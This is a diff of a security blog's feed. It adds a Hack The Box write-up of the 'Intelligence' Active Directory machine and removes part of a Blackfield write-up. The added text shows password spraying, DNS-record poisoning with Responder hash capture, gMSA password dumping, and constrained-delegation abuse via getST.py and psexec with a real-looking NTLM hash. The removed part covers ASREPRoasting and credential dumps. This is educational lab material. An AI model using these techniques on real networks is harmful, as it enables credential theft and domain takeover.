@@ -1,4 +1,345 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-07-01T15:56:47+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="https://omnisl4sh.github.io/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/28/Search</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-07-01T22:15:33+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="https://omnisl4sh.github.io/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/01/Intelligence</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
+
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>A <strong>Windows Domain Controller</strong> that’s hosting a static website on port 80.</li>
+  <li><em>While browsing the site,</em> we notice two links to <strong>PDF</strong> files that exist on a web directory for documents.</li>
+  <li><em>When checking the naming of the</em> <strong>PDF</strong> <em>files,</em> we notice a date-based scheme. So, we make a list of file names to look for other documents.</li>
+  <li>We find a lot of documents containing dummy text. Except for two which included information about a <strong>default password</strong> and about administrative activity going on as well as some hardening.</li>
+  <li>We also get a list of usernames when inspecting the metadata of the files. We use those to spray the domain users which results in our first set of credentials (<code class="language-plaintext highlighter-rouge">Tiffany.Molina</code>).</li>
+  <li><em>While checking Tiffany’s</em> <strong>SMB</strong> <em>share access,</em> we come across a <strong>PowerShell</strong> script on the <strong>“IT”</strong> share that routinely queries <strong>DNS</strong> for record names starting with <strong>“web”</strong> and issues <strong>authenticated</strong> web requests to them.</li>
+  <li><em>Knowing this information,</em> we use a tool called <code class="language-plaintext highlighter-rouge">dnstool.py</code> from the <strong>Krbrelayx</strong> toolkit to add a record that starts with <strong>“web”</strong> and points to our Kali machine’s IP address.</li>
+  <li><em>Having fired our</em> <code class="language-plaintext highlighter-rouge">responder</code> <em>to capture the</em> <strong>HTTP</strong> <em>request,</em> we wait for a couple of minutes and get the hash of a user called <code class="language-plaintext highlighter-rouge">ted.graves</code> who was running the script.</li>
+  <li><em>After running a</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>collection and viewing exploit paths from the users we own,</em> we find that <strong>Ted</strong> can read the <strong>gMSA</strong> password of <code class="language-plaintext highlighter-rouge">SVC_INT</code> which has <strong>contrained delegation</strong> on the Domain Controller.</li>
+  <li>We use the <code class="language-plaintext highlighter-rouge">gMSADumper</code> python tool to get the <strong>NTLM hash</strong> of <code class="language-plaintext highlighter-rouge">SVC_INT</code> and use it to request a <strong>silver ticket</strong> impersonating the <code class="language-plaintext highlighter-rouge">Administrator</code> for a full domain takeover.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Intelligence
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-30 20:31:02Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49692/tcp open  msrpc         Microsoft Windows RPC
+49708/tcp open  msrpc         Microsoft Windows RPC
+49715/tcp open  msrpc         Microsoft Windows RPC
+51310/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-time:
+|   date: 2022-06-30T20:31:57
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+</code></pre></div></div>
+<p><em>Viewing the port scan results,</em> we notice:</p>
+
+<ol>
+  <li>Standard Domain Controller ports: 53, 88, 389 &amp; 445</li>
+  <li><strong>WinRM</strong> on port 5985 which is nice for shell access</li>
+  <li><strong>IIS 10</strong> on Port 80 that we should take a look at</li>
+  <li><em>On the last line,</em> the <strong>Clock Skew</strong> between our host and the DC is 7 hours (which is something we must take care of to make sure anything <strong>Kerberos-related</strong> works well)</li>
+</ol>
+
+<h3 id="the-website">The Website</h3>
+<p><img src="/assets/Intelligence/website-homepage.jpg" alt="website-homepage" /></p>
+
+<p>checking the website’s home page doesn’t show anything special except for this:</p>
+
+<p><img src="/assets/Intelligence/document-links.jpg" alt="document-links" /></p>
+
+<p><em>Upon clicking any of those links,</em> we get directed to a <strong>“documents”</strong> directory.</p>
+
+<p>The content is some filler text. But we notice the naming of the documents is based on dates.</p>
+
+<p><img src="/assets/Intelligence/document-naming.jpg" alt="document-naming" /></p>
+
+<p>This is interesting because:</p>
+
+<ul>
+  <li>we want to see if there were <em>other documents</em></li>
+  <li><em>And if there were more,</em> we want to check their <strong>content</strong> as well as their <strong>metadata</strong></li>
+</ul>
+
+<p>we might get information we could use.</p>
+
+<h3 id="searching-documents">Searching Documents</h3>
+<p>We’re going to create a script that generates a list of <strong>PDF</strong> file names following the scheme we found.</p>
+
+<p>We’ll make the script generate dates between 2018 to 2022. That’s 2 years before and after the date of the found documents.</p>
+
+<p><strong>Note:</strong> This date range can take some time in the upcoming step. You can change it to be 2020 to 2021 if you just want to skip right to the solution. I’m only showing this because that’s what I did on my actual run :)</p>
+
+<p><em>Since I am most comfortable with</em> <strong>PowerShell</strong> <em>and since it also runs on</em> <strong>Linux</strong>, I’m going to be using it.</p>
+
+<p>Here’s the script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach($year in (2018 .. 2022)){
+	foreach($month in (1 .. 12)){
+	        if ($month -lt 10){$month = "0$month"}   # if the month's number is less than 10, put a zero before it
+	        foreach($day in (1..31)){
+	                if($day -lt 10){$day = "0$day"}  # if the day's number is less than 10, put a zero before it
+
+	                "$year-$month-$day-upload.pdf" &gt;&gt; pdf_name_list.txt # output the generated name into a text file
+	        }
+	}
+}
+</code></pre></div></div>
+
+<p>Which works like a charm :D</p>
+
+<p><img src="/assets/Intelligence/pdf-name-generation.jpg" alt="pdf-name-generation" /></p>
+
+<p>We create a specific folder for the <strong>PDF</strong>s and then write a quick <strong>bash</strong> loop to download every document it can find. we use <code class="language-plaintext highlighter-rouge">wget</code> with the <code class="language-plaintext highlighter-rouge">-q</code> flag to make it go quietly.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for doc in $(cat pdf_name_list.txt); do wget -q "http://10.10.10.248/documents/$doc"; done
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/a-lot-of-pdfs.jpg" alt="a-lot-of-pdfs" /></p>
+
+<p>The result is a large list of <strong>PDF</strong>s (99) from that process.</p>
+
+<p>We wanted to find a tool to get us their content in text if possible. So we <strong>Googled</strong> for it:</p>
+
+<p><img src="/assets/Intelligence/searching-for-pdf2text.jpg" alt="searching-for-pdf2text" /></p>
+
+<p><img src="/assets/Intelligence/pdf2text-instructions.jpg" alt="pdf2text-instructions" /></p>
+
+<p><em>After installing the package,</em> We’re going to use another <strong>bash</strong> script to create the converted text files.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for pdf in $(ls *.pdf); do pdftotext $pdf; done
+</code></pre></div></div>
+
+<p>We end up with 99 text files that we need to browse through :D</p>
+
+<p>Time for another script xD</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for text in $(ls *.txt); do echo $text; echo '---------------------'; cat $text; echo 'press any key to continue'; read; done
+</code></pre></div></div>
+
+<p>This displays the document names and allows you to browse each.</p>
+
+<p>We find one interesting document: <code class="language-plaintext highlighter-rouge">2020-06-07-upload.txt</code></p>
+
+<p><img src="/assets/Intelligence/second_note.jpg" alt="second_note" /></p>
+
+<p>Which talks about changing the default password: <strong>“NewIntelligenceCorpUser9876”</strong> for new users after logging in.</p>
+
+<p><em>If one of the users still has this password</em>, this could be our way of gaining access.</p>
+
+<p>We also find another document: <code class="language-plaintext highlighter-rouge">2020-12-30-upload.txt</code></p>
+
+<p><img src="/assets/Intelligence/first_note.jpg" alt="first_note" /></p>
+
+<p>It talks about a user <code class="language-plaintext highlighter-rouge">ted</code> (<em>who’s probably in IT</em>) developing a <strong>script</strong> to notify people if a web server goes down.</p>
+
+<p>And it also mentions <strong>“locking down service accounts”</strong> which hints at a <strong>possible security concern</strong> in that area.</p>
+
+<h3 id="interesting-information-in-metadata">Interesting Information in Metadata</h3>
+<p>Now we need a list of usernames..</p>
+
+<p><em>With all those</em> <strong>PDF</strong>s <em>lying around,</em> we’re tempted to look for information in <strong>metadata.</strong></p>
+
+<p>Our tool of choice is <code class="language-plaintext highlighter-rouge">exiftool</code></p>
+
+<p>We do a quick sample test on one of the documents:</p>
+
+<p><img src="/assets/Intelligence/creator-metada.jpg" alt="creator-metada" /></p>
+
+<p>We find that there’s a <strong>Creator</strong> field with a possible username in it.</p>
+
+<p>We use the tool with the <code class="language-plaintext highlighter-rouge">-creator</code> flag to only extract that field.</p>
+
+<p>We couple this with some Shell Fu to create a user list:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for pdf in $(ls *.pdf); do exiftool -creator $pdf | awk -F ': ' '{print $2}'; done | sort -u &gt; userlist.txt
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/exiftool-userlist.jpg" alt="exiftool-userlist" /></p>
+
+<p>Clean! :D</p>
+
+<p>We then validate those usernames using <a href="https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a></p>
+
+<p><img src="/assets/Intelligence/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>
+
+<p>All 30 users were valid.</p>
+
+<p><em>Before spraying them with the default password,</em> we gotta sync our time with the <strong>Domain Controller</strong> since we’re going to be doing <strong>Kerberos authentication</strong>.</p>
+
+<p>A tool that automates that is <code class="language-plaintext highlighter-rouge">ntpdate</code>. But you have to disable the <strong>Automatic Time Feature</strong> in kali first using <code class="language-plaintext highlighter-rouge">timedatectl set-ntp off</code></p>
+
+<p>We do this and we’re now in sync with the <strong>DC</strong> :]</p>
+
+<p><img src="/assets/Intelligence/remove-clock-skew.jpg" alt="remove-clock-skew" /></p>
+
+<p><img src="/assets/Intelligence/got-tiffany.jpg" alt="got-tiffany" /></p>
+
+<p>Tiffany hadn’t changed her default password. Lucky for us :D</p>
+
+<h3 id="exploiting-the-vulnerable-script">Exploiting the Vulnerable Script</h3>
+<p><em>When checking the readable</em> <strong>SMB</strong> <em>shares as Tiffany,</em> we find that she can read a certain share: <strong>IT</strong></p>
+
+<p><img src="/assets/Intelligence/smb-shares-tiffany.jpg" alt="smb-shares-tiffany" /></p>
+
+<p>We connect to it using <code class="language-plaintext highlighter-rouge">smbclient</code> and find the script that the previous note was talking about:</p>
+
+<p><img src="/assets/Intelligence/script.jpg" alt="script" /></p>
+
+<p>When checking its content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
+	try {
+		$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+		if(.StatusCode -ne 200) {
+			Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject "Host: $($record.Name) is down"
+		}
+	}
+	catch {}
+}
+</code></pre></div></div>
+
+<p>We can see that the script:</p>
+<ul>
+  <li>Runs every 5 minutes
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Check web server status. Scheduled to run every 5min
+</code></pre></div>    </div>
+  </li>
+  <li>Looks for <strong>DNS</strong> records that start with <strong>“web”</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*"
+</code></pre></div>    </div>
+  </li>
+  <li>Uses the credentials of the user running the script to issue web requests for every record match
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><em>In order to exploit this,</em> we need to:</p>
+<ol>
+  <li>Find a way to put up a <strong>DNS</strong> record that points to our attacker machine</li>
+  <li>Start a web server that can capture the <strong>NTLM authentication</strong> sent with the request</li>
+</ol>
+
+<p>The answers for both those challenges is <a href="/assets/Intelligence/https://github.com/dirkjanm/krbrelayx">dnstool.py</a> from the <strong>krbrelayx</strong> toolkit and <a href="https://github.com/SpiderLabs/Responder">responder</a></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">dnstool.py</code></strong> lets us set a <strong>DNS</strong> record if we have valid domain credentials.</p>
+
+<p>We check its help and upload a record that points to our <strong>Kali</strong></p>
+
+<p><img src="/assets/Intelligence/dnstool-usage.jpg" alt="dnstool-usage" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">responder</code></strong> starts a <em>specially-setup</em> HTTP server that will capture the <strong>NTLMv2</strong> hash of the incoming request.</p>
+
+<p>We will start it specifying our <strong>VPN</strong> tunnel interface: <code class="language-plaintext highlighter-rouge">responder -I tun0</code></p>
+
+<p><em>After a few minutes,</em> we get an <strong>NTLMv2</strong> hash for the <code class="language-plaintext highlighter-rouge">Ted.Graves</code> user.</p>
+
+<p><img src="/assets/Intelligence/captured-hash.jpg" alt="captured-hash" /></p>
+
+<p>We could successfully crack it using <code class="language-plaintext highlighter-rouge">john</code></p>
+
+<p><img src="/assets/Intelligence/teddys-hash-cracked.jpg" alt="teddys-hash-cracked" /></p>
+
+<h3 id="bloodhound-and-the-path-to-domain-admin">Bloodhound and the Path to Domain Admin</h3>
+<p><em>After running the</em> <strong>Bloodhound</strong> <em>python Ingestor</em> <a href="/assets/Intelligence/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">Bloodhound.py</code></a>, we mark our user <code class="language-plaintext highlighter-rouge">Ted.Graves</code> as owned.</p>
+
+<p>We see a <strong>clear exploit path</strong> to <strong>Domain Admin</strong> when we view the results of the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principals</code> built-in query:</p>
+
+<p><img src="/assets/Intelligence/bloodhound-path-to-da.jpg" alt="bloodhound-path-to-da" /></p>
+
+<ol>
+  <li><strong>Ted</strong> can read the password for <code class="language-plaintext highlighter-rouge">SVC_INT$</code></li>
+  <li><code class="language-plaintext highlighter-rouge">SVC_INT$</code> has <strong>Constrained Delegation</strong> over the Domain Controller (which we will talk about in the next section).</li>
+</ol>
+
+<p>Let’s first get the <strong>NTLM</strong> hash for the <code class="language-plaintext highlighter-rouge">SVC_INT$</code> group-managed service account.</p>
+
+<p>we can do so using <a href="/assets/Intelligence/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>
+
+<p><img src="/assets/Intelligence/gMSADumped.jpg" alt="gMSADumped" /></p>
+
+<p>We’re now good for the next step.</p>
+
+<h3 id="abusing-constrained-delegation">Abusing Constrained Delegation</h3>
+<p><em>In our case,</em> <code class="language-plaintext highlighter-rouge">SVC_INT$</code> is allowed delegation to the Domain Controller.</p>
+
+<p>This means that it can <strong>impersonate any user</strong> (even Administrators) when interacting with the DC as the <strong>WWW</strong> service.</p>
+
+<p>We know so by inspecting the account on <code class="language-plaintext highlighter-rouge">bloodhound</code></p>
+
+<p><img src="/assets/Intelligence/allowed-to-delegate.jpg" alt="allowed-to-delegate" /></p>
+
+<p><em>However, because the</em> <strong>service portion</strong> <em>in the granted</em> <strong>service ticket</strong> <em>is</em> <strong>unprotected</strong>, we may alter it for <strong>any service</strong> we want.</p>
+
+<p><strong>For example:</strong> we can get a ticket for the <strong>LDAP</strong> service and be granted <strong>DCSync</strong> rights.</p>
+
+<p>It was all mentioned on the <strong>Bloodhound</strong> help</p>
+
+<p><img src="/assets/Intelligence/allowed-to-delegate-bh-help.jpg" alt="allowed-to-delegate-bh-help" /></p>
+
+<p>Let’s go ahead and exploit this! :D</p>
+
+<p>We will first request the ticket using <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a>’s <code class="language-plaintext highlighter-rouge">getST.py</code> script</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator intelligence.htb/'svc_int$' -hashes :6bf735e60852b92212d512a4deadcfea
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/getting-admin-ticket.jpg" alt="getting-admin-ticket" /></p>
+
+<p>The ticket is now saved to disk. We’re going to export it to our environment and use it to own the box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export KRB5CCNAME=&lt;path/to/ticket&gt;
+psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
+
+<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="https://omnisl4sh.github.io/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/28/Search</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2500,280 +2841,4 @@ sc.exe start dns
   <li>Also, copying the <code class="language-plaintext highlighter-rouge">msfvenom</code> generated locally on the machine dll didn’t work because the antivirus kept eating it up xD</li>
 </ul>
 
-<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)</title><link href="https://omnisl4sh.github.io/2022/04/18/Blackfield.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)" /><published>2022-04-18T00:00:00+02:00</published><updated>2022-04-18T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/18/Blackfield</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/18/Blackfield.html"><![CDATA[<p><img src="/assets/Blackfield/Blackfield.png" alt="BlackField" /></p>
-
-<h3 id="summary">Summary</h3>
-<ul>
-  <li>A <strong>Domain Controller</strong> machine. We first find <strong>SMB anonymous read access</strong> to a share containing a list of folders which can be used as usernames.</li>
-  <li>We perform an <strong>ASREPRoast attack</strong> using the created wordlist to get credentials for the <code class="language-plaintext highlighter-rouge">support</code> user.</li>
-  <li><em>Using</em> <strong>BloodHound</strong> <em>to enumerate the domain,</em> we find that this user <em>can reset the password for another account</em> <code class="language-plaintext highlighter-rouge">audit2020</code></li>
-  <li><em>After resetting</em> <code class="language-plaintext highlighter-rouge">audit2020</code>‘<em>s password</em>, we gain access to the <code class="language-plaintext highlighter-rouge">forensic</code> <strong>SMB share</strong> which has a <strong>memory dump</strong> of <code class="language-plaintext highlighter-rouge">lsass.exe</code></li>
-  <li><em>Using</em> <code class="language-plaintext highlighter-rouge">Mimikatz</code> <em>to extract hashes from the dump,</em> we gain access to the <code class="language-plaintext highlighter-rouge">svc_backup</code> user.</li>
-  <li><code class="language-plaintext highlighter-rouge">svc_backup</code> is a member of the <strong>Backup Operators</strong> group which have the <em>privilege of backing up most files on the domain controller</em>.</li>
-  <li>We <em>abuse</em> this privilege to back up the <strong>NTDS.dit</strong> file and the <strong>system registry hive</strong> which we use to dump <strong>all the NTLM hashes of the domain</strong>.</li>
-  <li><em>With the Domain Administrators NTLM hash,</em> we can <strong>Pass-the-Hash</strong> to gain full access.</li>
-</ul>
-
-<hr />
-
-<h3 id="standard-nmap">Standard Nmap</h3>
-<p>We do a standard <code class="language-plaintext highlighter-rouge">nmap</code> with service detection <code class="language-plaintext highlighter-rouge">-sV</code> and default scripts <code class="language-plaintext highlighter-rouge">-sC</code> on all ports:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE       VERSION
-53/tcp   open  domain        Simple DNS Plus
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-15 21:28:00Z)
-135/tcp  open  msrpc         Microsoft Windows RPC
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
-5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: 6h59m58s
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2022-04-15T21:28:14
-|_  start_date: N/A
-</code></pre></div></div>
-
-<h3 id="domain-controller-signature">Domain Controller Signature</h3>
-
-<p>We see a combination of ports indicative of a <strong>Domain Controller</strong>: <strong>DNS</strong> on 53, <strong>Kerberos</strong> on 88, <strong>LDAP</strong> on 389 and <strong>SMB</strong> on 445.
-We also notice the domain name on LDAP is <strong>Blackfield.local</strong> and the hostname <strong>DC01</strong></p>
-
-<p>we add an <code class="language-plaintext highlighter-rouge">nameserver</code> entry in our <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code> file for the machine’s IP and proceed to enumerate <strong>SMB</strong> for null/anonymous access.</p>
-
-<h3 id="smb-enumeration">SMB Enumeration</h3>
-
-<p>we try a few inputs and manage to get a listing of the shares using anonymous authentication:</p>
-
-<p><img src="/assets/Blackfield/SMB-share-enum.jpg" alt="SMB-share-enum" /></p>
-
-<p><em>looking at the shares,</em> we see that we have <code class="language-plaintext highlighter-rouge">READ</code> access to the <code class="language-plaintext highlighter-rouge">profiles$</code> share. We also notice another non-standard share: <code class="language-plaintext highlighter-rouge">forensic</code> that had a comment <code class="language-plaintext highlighter-rouge">Forensic / Audit share</code></p>
-
-<p><em>connecting with</em> <code class="language-plaintext highlighter-rouge">smbclient</code>, we see many folders that look like usernames:</p>
-
-<p><img src="/assets/Blackfield/profiles-share.jpg" alt="profiles-share" /></p>
-
-<h3 id="mounting-smb-to-linux">Mounting SMB to Linux</h3>
-
-<p>we mount the share using <code class="language-plaintext highlighter-rouge">mount -t cifs -o 'username=a' //10.10.10.192/Profiles$ /mnt</code> so we can use handy commands like <code class="language-plaintext highlighter-rouge">find</code> and look for interesting files within.</p>
-
-<p><img src="/assets/Blackfield/no-files-in-prof-share.jpg" alt="no-files-in-prof-share" /></p>
-
-<p>we notice no files are there. But, we can still save those foldernames to be used as a <em>userlist</em> for future attacks. we do that using <code class="language-plaintext highlighter-rouge">ls</code> with the <code class="language-plaintext highlighter-rouge">-1</code> flag to have the names on one column.</p>
-
-<h3 id="asreproasting">ASREPRoasting</h3>
-
-<p><em>Having this list,</em> we launch an <code class="language-plaintext highlighter-rouge">ASREPRoast</code> attack using <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code>.</p>
-
-<p><code class="language-plaintext highlighter-rouge">GetNPUsers.py -dc-ip 10.10.10.192 blackfield.local/ -request -usersfile users.txt</code></p>
-
-<p><img src="/assets/Blackfield/asrep-roast.jpg" alt="asrep-roast" /></p>
-
-<p><em>looking at the output,</em> we notice the hash has been captured for the <code class="language-plaintext highlighter-rouge">support</code> user. We also notice that <em>for most users,</em> we get the error: <code class="language-plaintext highlighter-rouge">Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</code> that indicates that those usernames don’t exist. <em>As for the users with the error:</em> <code class="language-plaintext highlighter-rouge">User &lt;USER&gt; doesn't have UF_DONT_REQUIRE_PREAUTH set</code> they exist but are not <em>ASREPRoastable</em>.</p>
-
-<p>these were <code class="language-plaintext highlighter-rouge">svc_backup</code> and <code class="language-plaintext highlighter-rouge">audit2020</code>.</p>
-
-<p>we’re going to need to get to that <code class="language-plaintext highlighter-rouge">audit2020</code> user if we want access to its share (<code class="language-plaintext highlighter-rouge">forensic</code>).</p>
-
-<p><em>Right now,</em> we need to crack the hash for the <code class="language-plaintext highlighter-rouge">support</code> user. We do that using <code class="language-plaintext highlighter-rouge">john</code> and the password is <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code>.</p>
-
-<p>We try authenticating using <code class="language-plaintext highlighter-rouge">crackmapexec</code> and are successful.</p>
-
-<p><img src="/assets/Blackfield/support-smb-shares.jpg" alt="support-smb-shares" /></p>
-
-<p>We try to remote using <strong>WinRM</strong> but no luck :/</p>
-
-<h3 id="getting-all-ad-users-for-future-attacks">Getting all AD users for future attacks</h3>
-
-<p><em>After investigating the new-accessible shares</em> <code class="language-plaintext highlighter-rouge">SYSVOL</code> <em>and</em> <code class="language-plaintext highlighter-rouge">NETLOGON</code>, we find nothing important. So we proceed to pull the full userlist from the domain using <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">GetADUsers.py</code>:</p>
-
-<p><img src="/assets/Blackfield/impacket-get-ad-user.jpg" alt="impacket-get-ad-user" /></p>
-
